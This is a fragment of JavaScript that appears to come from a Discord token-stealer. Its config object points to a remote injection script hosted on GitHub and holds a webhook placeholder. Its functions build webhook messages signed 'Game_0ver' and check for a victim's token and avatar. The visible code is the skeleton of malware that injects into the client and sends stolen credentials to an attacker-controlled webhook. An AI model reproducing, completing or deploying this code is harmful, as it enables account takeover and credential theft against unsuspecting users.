...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/Capenigma/PowerGreen/main/cat/loli/lis/index.js",
    webhook: "REPLACE_ME",
...
const makeEmbed = async ({
    ...
    var params = {
        username: "Game_0ver",
        avatar_url: "https://www.shutterstock.com/image-vector/game-over-retro-futuristic-glow-600w-2178685625.jpg",
        content: "",
        embeds: [{
            title: title,
...
const FirstTime = async () => {
    ...
    if (!token) {
        ...
        if (!user.avatar) var userAvatar = "https://www.shutterstock.com/image-vector/game-over-retro-futuristic-glow-600w-2178685625.jpg"
